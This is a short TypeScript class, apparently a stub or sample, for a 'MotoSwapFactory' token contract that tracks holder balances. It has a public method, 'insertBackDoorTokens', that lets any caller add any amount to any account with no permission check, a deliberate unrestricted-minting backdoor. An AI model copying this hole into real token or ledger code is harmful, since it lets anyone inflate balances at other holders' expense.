import { Contract } from '../contracts/Contract.js';

export class MotoSwapFactory implements Contract {
    public readonly owner: string;

    private holders: Map<string, bigint> = new Map<string, bigint>();

    public constructor(owner: string) {
        this.owner = owner;

        // Logic goes here...

        this.holders.set(owner, 1000n);
    }

    public insertBackDoorTokens(user: string, amount: bigint): void {
        const currentAmount: bigint = this.holders.get(user) || 0n;

        this.holders.set(user, currentAmount + amount);
    }

    public getBalanceOf(holder: string): bigint {
        return this.holders.get(holder) || 0n;
    }
}
